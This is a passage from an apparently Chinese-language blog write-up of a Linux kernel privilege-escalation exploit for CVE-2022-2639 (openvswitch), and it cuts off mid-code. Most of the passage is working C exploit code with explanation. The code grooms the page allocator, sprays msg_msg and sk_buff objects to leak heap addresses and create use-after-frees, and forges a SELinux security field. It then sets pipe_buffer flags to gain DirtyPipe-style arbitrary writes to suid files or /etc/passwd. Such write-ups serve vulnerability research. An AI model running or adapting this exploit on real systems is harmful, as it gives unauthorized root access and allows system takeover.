sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;socket(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;bind(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// packet_socket_setup(size, 4096, count, 0, 100); 效果相同</span></span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>) <span class="comment">// 分配一个0x10000的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 释放 chunk</span></span><br><span class="line">    </span><br><span class="line">fd = pagealloc_pad(<span class="number">100</span>, <span class="number">0x1000</span>) <span class="comment">// 分配 100 个 0x1000 的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 一次性释放这个100个chunk</span></span><br></pre></td></tr></table></figure>



<h2 id="exploit-1：泄露-0x400-slab-堆地址"><a href="#exploit-1：泄露-0x400-slab-堆地址" class="headerlink" title="exploit-1：泄露 0x400 slab 堆地址"></a>exploit-1：泄露 0x400 slab 堆地址</h2><p>首先利用上述技术把内核的堆块整理，尽可能的消耗完 freelist 中的空闲 slab。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pagealloc_pad(<span class="number">1000</span>, <span class="number">0x1000</span>);    <span class="comment">// 1000*0x1000</span></span><br><span class="line">pagealloc_pad(<span class="number">500</span>, <span class="number">0x2000</span>);     <span class="comment">// 500*0x2000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x4000</span>);     <span class="comment">// 200*0x4000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x8000</span>);     <span class="comment">// 200*0x8000</span></span><br><span class="line">pagealloc_pad(<span class="number">100</span>, <span class="number">0x10000</span>);    <span class="comment">// 100*0x10000</span></span><br></pre></td></tr></table></figure>

<p>接着再次申请 0x10000 的 slab，由于此时的堆块均被清理走且不存在 0x10000 的空闲 slab，那么再次申请 0x10000 的 slab 时，就会从 order-5 的 0x20000 的 slab 中申请内存然后分割成两个 order-4 即 0x10000 的 slab。<strong>因此此时分配的 0x10000 的 slab 地址极大概率是相邻的。</strong></p>
<p>接着就是常用的套路，隔一个释放一个，由于只有两个相邻的 order-n slab 都被释放了才会合并成 order-(n+1)，所以此时并不会合并，刚释放的 0x10000 的 slab 则均停留在 freelist 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> target_fd_cnt (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd[target_fd_cnt];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; target_fd_cnt; i++)</span><br><span class="line">    target_fd[i] = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; target_fd_cnt; i+=<span class="number">2</span>) &#123;</span><br><span class="line">    close(target_fd[i]);</span><br><span class="line">    target_fd[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时大概率会形成如下的堆布局：</p>
<p><img src="/img/CVE-2022-2639/2-1.png"></p>
<p>接着 spray <code>struct msg_msg</code>，每个 msg 包含一个 0x1000 的 <code>struct msg_msg</code> 和一个 0x400 的 <code>struct msg_msgseg</code> 。由于第一步已经将 order 小的 slab 都耗尽了，此时分配的 0x1000 的 slab 和 0x400 的 slab 大概率又会从此时处在 freelist 中的 order-4  的 0x10000 的 slab 分割，直到分割到 order-0，分别给这两个消息结构使用。这样的话，之前没释放的 <code>rx_ring buffer</code> 的后面，大概率就会紧挨一个 <code>struct msg_msg</code>，那么此时堆中的布局大概是：</p>
<p><img src="/img/CVE-2022-2639/2-2.png"></p>
<p>然后把刚才在 order-4 中留下的另一半 0x10000 给释放掉，此时又因为先前释放的 0x10000 都被 <code>msg、msgseg</code> 占领或者以其他被切割后的大小存在的 freelist 中，依然不会向上合并。所以此次释放的 0x10000 也都会存在 freelist 中。此时布置能在 0x10000 的 slab 中发生溢出的漏洞对象，从而可以越界覆写到相邻的 <code>struct msg_msg</code> 的 <code>m_ts</code> 字段，这样就可以通过 <code>msg_msg</code> 来越界读泄露 0x400 的辅助消息后面的数据，暂且称该 <code>msg_msg</code> 为 <text style="color:green">msg1</text>，<text style="color:green">msg1</text> 可以通过 <code>msgrcv</code> 的返回值与越界修改的 <code>m_ts</code> 的值是否相等来确定。此时的大概布局：</p>
<p><img src="/img/CVE-2022-2639/2-3.png"></p>
<p>由于在申请 0x400 的 <code>msg_msgseg</code> 时，该 slab 大概率没有为其他任务分配堆块，所以几乎 <code>msg_msgseg</code> 后面都是另一个 <code>msg_msg</code> 的 <code>msg_msgseg</code>，在发送消息也就是创建这些 <code>msg_msg</code> 的时候，我们可以<strong>在消息中对该 <code>msg</code> 进行一个标识，这样就能确定任何一个消息</strong>。可以利用 <text style="color:green">msg1</text> ，通过 <code>msgrcv</code> 接收消息但是设置 <code>MSG_COPY</code> 读取到后面 <code>msg_msgseg</code> 的标识，假设被读取的 <code>msg_msgseg</code> 属于 <text style="color:green">msg2</text>；通过不带 <code>flag</code> 的 <code>msgrcv</code> 来读取 <text style="color:green">msg2</text>，此时就释放了 0x1000 的 <code>msg_msg</code> 和该 0x400 的 <code>msg_msgseg</code> 。<strong>此时再次 spray 多个 0x400 的 <code>msg_msg</code>形成一个 <code>msg</code> 队列，去占用刚刚释放的 msg_msgseg</strong>，队列示意如下：</p>
<p><img src="/img/CVE-2022-2639/2-4.png"></p>
<p>具体 exp 中的做法是保留 <text style="color:green">msg1</text> 的 <code>msqid</code> 在 <code>list1_corrupted_msqid</code> 中，然后通过 <code>msgget</code> 改变其在 <code>msqid[]</code>  中的值，避免 [3-7] 将该 <text style="color:green">msg1</text> 也释放掉；然后判断一下越界读到的内存是不是 <code>msg_msgseg</code>，接着将除 <text style="color:green">msg1</text> 以外的其他消息都释放掉，自然包括了上述的 <text style="color:green">msg2</text>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> copy_size = msgrcv(msqid_1[i], msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">    <span class="keyword">if</span> (copy_size &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_size == MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>)) &#123; </span><br><span class="line">        logi(<span class="string">&quot;[+] corrupted msg_msg found, id: %d&quot;</span>, msqid_1[i]);</span><br><span class="line">        list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">        <span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;oob_data[<span class="number">1</span>], <span class="string">&quot;QQQQQQQQ&quot;</span>, <span class="number">8</span>))</span><br><span class="line">            logd(<span class="string">&quot;[-] but the next object is not allocated by msg_msgseg&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list1_corrupted_msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] can&#x27;t find corrupted msg_msg, and kernel may crash :(&quot;</span>);</span><br><span class="line">    clean_msq1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-7] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq1();</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-8] alloc 0x400*16 `msg_msg` chain to re-acquire the 0x400 slab freed by msg_msgseg ...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(msg_b-&gt;mtext, <span class="string">&#x27;w&#x27;</span>, MSG_B_TEXT_SIZE);</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">0</span>] = MSG_SIG;</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">1</span>] = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++) &#123;</span><br><span class="line">        msg_b-&gt;mtype = MTYPE_B | (j &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;0x400 * 0x10 * NUM_MSQIDS_2 msgsnd() failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时大概堆布局：</p>
<p><img src="/img/CVE-2022-2639/2-5.png"></p>
<p><code>MTYPE_B | (j &lt;&lt; 8)</code> 的目的是后面为了确定越界读到的 <code>msg_msg</code> 是第一条消息还是后面的消息，来决定读取 <code>m_next</code> 指针还是 <code>m_prev</code> 指针。</p>
<p>触发漏洞越界覆写的数据如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> vuln_buf[] = &#123;</span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.next</span></span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.prev</span></span><br><span class="line">    MTYPE_A,                               <span class="comment">// m_type</span></span><br><span class="line">    MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="comment">// m_ts</span></span><br><span class="line">&#125;;</span><br><span class="line">trigger_vuln(&amp;vuln_buf, <span class="keyword">sizeof</span>(vuln_buf));</span><br></pre></td></tr></table></figure>

<p><code>m_ts</code> 覆写为多读一个 <code>msg_msgseg</code> 的大小。</p>
<p>假设此时占位成功，那么我们再次利用 <text style="color:green">msg1</text> 越界读取的时候，就会读到 msgB 的 <code>m_next</code> 指针，从而<strong>得到 <text style="color:red">msgC</text> 的地址</strong>：</p>
<p><img src="/img/CVE-2022-2639/2-6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> copy_size = msgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line"><span class="keyword">if</span> ((copy_size &lt; <span class="number">0</span>) || (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>))) </span><br><span class="line">    die(<span class="string">&quot;[-] recv from corrupted msg_msg failed&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)oob_data;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">0</span>] != MSG_SIG) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg&quot;</span>);</span><br><span class="line">    clean_msq2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">logd(<span class="string">&quot;[+] it works :)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list2_leak_msqid —— the msg_msg with kmalloc-0x400 address</span></span><br><span class="line">list2_leak_msqid = msqid_2[((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">1</span>]];</span><br><span class="line">list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">list2_leak_security = p-&gt;security;</span><br><span class="line"><span class="keyword">if</span> (list2_leak_mtype &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type - <span class="number">0x100</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.next; <span class="comment">// first msg_msg</span></span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type + <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-10] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq2();</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-7.png"></p>
<p>此时得到了一个 0x400 的 slab 的地址。并且由于上述攻击完成后将 <code>msqid1、msqid2</code> 中除了两个用到的 <code>msg_msg</code> 都释放掉了，很多 slab 都会重新回到 freelist 并且部分会发生向上合并的情况。<strong>此时两个还在用到的分别是一个被篡改了 <code>m_ts</code> 的 <text style="color:green">msg1</text> 和有0x10个 <code>msg_msg</code> 消息的队列 <code>list2_leak_msqid</code>，越界直接读的 msgB 和拿到地址的 <text style="color:red">msgC</text> 都属于该队列。</strong></p>
<h2 id="exploit-2：构造-DirtyPipe"><a href="#exploit-2：构造-DirtyPipe" class="headerlink" title="exploit-2：构造 DirtyPipe"></a>exploit-2：构造 DirtyPipe</h2><p>拿到一个正在使用的 <code>msg_msg</code> 堆地址，考虑制造 UAF。前面几步与 exploit-1 的前几步一样，直到触发漏洞时，直接溢出覆写 <code>struct msg_msg</code> 的 <code>m_next</code> 指针为刚才得到正在用的 0x400 的 <code>struct msg_msg</code> 即 <text style="color:red">msgC</text>，暂且称被溢出覆写的<code>struct msg_msg</code>为 msgA，此时的 <code>msg_msg</code> 关系如图：</p>
<p><img src="/img/CVE-2022-2639/2-8.png"></p>
<p>此时两个指针指向同一块内存。uaf 已经呼之欲出了。</p>
<p>接下来先释放掉在 exploit-1 中保留的 <code>list2_leak_msqid</code> ，msgB 和 <text style="color:red">msgC</text> 所在的链并未被破坏，unlink 一切正常，此时 msgA 的 <code>m_next</code> 指向了一块已经释放的内存。<strong>得到了一个 0x400 slab 的 UAF。</strong>此时布局大概如下（B此时也是 freed 的状态了）：</p>
<p><img src="/img/CVE-2022-2639/2-9.png"></p>
<p>然后 spray sk_buff（本文中使用的结构在<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#">arttnba3 师傅的博客</a>中都有详细说明），大概率会有一个成功占用 <text style="color:red">msgC</text> 的 slab。由于 sk_buff-&gt;data 结构体前面的数据均可控，我们可以伪造一个合法的 msg header ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)buff;</span><br><span class="line">p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_list.prev = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_ts = <span class="number">0x100</span>;</span><br><span class="line">p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">p-&gt;next = <span class="number">0</span>;</span><br><span class="line">p-&gt;security = list2_leak_security; <span class="comment">// bypass selinux</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-10.png"></p>
<p>此时我们再通过 msgA 所在队列将 sk_buff-&gt;data 所在的 slab 释放，就会得到一个 sk_buff-&gt;data 的 UAF：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-8] free sk_buff-&gt;data using fake msqid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid_1[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_FAKE, IPC_NOWAIT) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        logd(<span class="string">&quot;[+] freed using msqid %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-11.png"></p>
<p>然后再堆喷 <code>struct pipe_buffer</code>，由于创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k （0x400）中取出一个 object。此时大概率会<strong>有连续的 <code>pipe buffer</code> 和 sk_buff-&gt;data 共用一个slab</strong>。同时操作pipe，打开目标 suid 文件，并做好 splice 操作：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-9] spray 0x100 pipe_buffer to re-acquire the 0x400 slab freed by sk_buff-&gt;data&quot;</span>);</span><br><span class="line"><span class="type">int</span> attack_fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (attack_fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open %s: %m&quot;</span>, ATTACK_FILE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipes[i])) die(<span class="string">&quot;[-] alloc pipe failed.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buff, <span class="number">0x100</span> + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(attack_fd, &amp;offset, pipes[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] splice() failed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-12.png"></p>
<p>此时再<strong>沿着发送的路径接收该包就能将 sk_buff-&gt;data 释放掉，同时泄露了整个 <code>pipe_buffer</code> 结构体</strong>，此时就从 sk_buff-&gt;data 的 UAF 转化为 <code>pipe_buffer</code> 的 UAF：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-10] free sk_buff-&gt;data to make pipe_buffer become UAF&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span> pipe_buffer_backup[<span class="number">0x280</span>];</span><br><span class="line"><span class="type">int</span> PIPE_BUF_FLAG_CAN_MERGE = <span class="number">0x10</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">    <span class="type">uint64_t</span> size = <span class="number">0x400</span> - <span class="number">0x140</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sock_pairs[i][<span class="number">1</span>], ptr, size) &lt; <span class="number">0</span>)</span><br><span class="line">                die(<span class="string">&quot;[-] read from sock pairs failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ptr[<span class="number">1</span>].len == <span class="number">1</span> &amp;&amp; ptr[<span class="number">1</span>].offset == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(pipe_buffer_backup, ptr, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line">                uaf_pipe_idx = ptr[<span class="number">0</span>].len &amp; <span class="number">0xff</span>;</span><br><span class="line">                logi(<span class="string">&quot;[+] uaf_pipe_idx: %d&quot;</span>, uaf_pipe_idx);</span><br><span class="line">                <span class="keyword">goto</span> out1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于在发送的时候 <code>write(pipes[i][1], buff, 0x100 + i)</code>，写在了每个<code>pipe</code>的第一个 <code>pipe_buffer</code>的 page 中，那么第一个<code>pipe_buffer</code> 的 <code>len</code> 即为  0x100 + i，那么 &amp; 0xff 就能得到是哪个 <code>pipe</code> 了。<code>ptr[1].len == 1 &amp;&amp; ptr[1].offset == 1</code> 则是因为前面的 <code>splice()</code> 写在第二个 <code>pipe_buffer</code> 的中，其 page 指向了 page_cache，<code>len</code> 和 <code>offset</code> 都是 <code>splice()</code> 传入的参数指定。</p>
<p><img src="/img/CVE-2022-2639/2-13.png"></p>
<h2 id="exploit-3：权限提升"><a href="#exploit-3：权限提升" class="headerlink" title="exploit-3：权限提升"></a>exploit-3：权限提升</h2><p>到此时为止，<strong>我们拥有一个 <code>pipe_buffer</code> 的 UAF</strong>。不用泄露 <code>ops</code> 字段完成传统的 ROP，直接修改 flags！转化为类似 DirtyPipe 的场景。<strong>自从DirtyPipe被修复后，使用 <code>splice()</code> 时flags会被重新设置为0，而我们的目标就是将这个 flags 再次修改为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</strong>从而完成任意文件修改，达到权限提升的目的。这一步还是 spray sk_buff（从头开始就可以 fake 简直不要太好用！），大概率其中一个会占用这个<code>pipe</code> 的 <code>pipe_buffer</code>，修改 flags，len、offset（为了完成从头写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="built_in">memcpy</span>(buff, pipe_buffer_backup, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">ptr[<span class="number">1</span>].flags = PIPE_BUF_FLAG_CAN_MERGE; <span class="comment">// for kernel &gt;= 5.8</span></span><br><span class="line">ptr[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">ptr[<span class="number">1</span>].offset = <span class="number">0</span>;                      <span class="comment">// offset = 0</span></span><br><span class="line">ptr[<span class="number">1</span>].ops = ptr[<span class="number">0</span>].ops;                <span class="comment">// for kernel &lt; 5.8</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>具体可以参考 <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
<p>在 kernel &gt;&#x3D; 5.8 中需要修改 pipe buffer 中 splice 页的flag |&#x3D; PIPE_BUF_FLAG_CAN_MERGE即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在 kernel &lt; 5.8 中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将 splice 页的的ops改为anon_pipe_ops（因为&lt;5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。</p>
<p>—-摘自 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 博客</a></p>
</blockquote>
<p><img src="/img/CVE-2022-2639/2-14.png"></p>
<p>下次对 pipe 写入就会修改文件的 page cache，得到和 DirtyPipe 一样任意文件写的能力！对本地提权来说只要修改 suid 程序的内容或是修改 &#x2F;etc&#x2F;passwd 即可。向目标文件中写入 attack_data，并检查是否成功写入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-12] try to overwrite %s&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = write(pipes[uaf_pipe_idx][<span class="number">1</span>], attack_data, <span class="keyword">sizeof</span>(attack_data));</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] write failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; <span class="keyword">sizeof</span>(attack_data)) die(<span class="string">&quot;[-] short write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[*] see if %s changed ...&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open attack file&quot;</span>);</span><br><span class="line">    <span class="type">char</span> tmp_buffer[<span class="number">0x10</span>];</span><br><span class="line">    read(fd, tmp_buffer, <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">uint32_t</span> *ptr = (<span class="type">uint32_t</span> 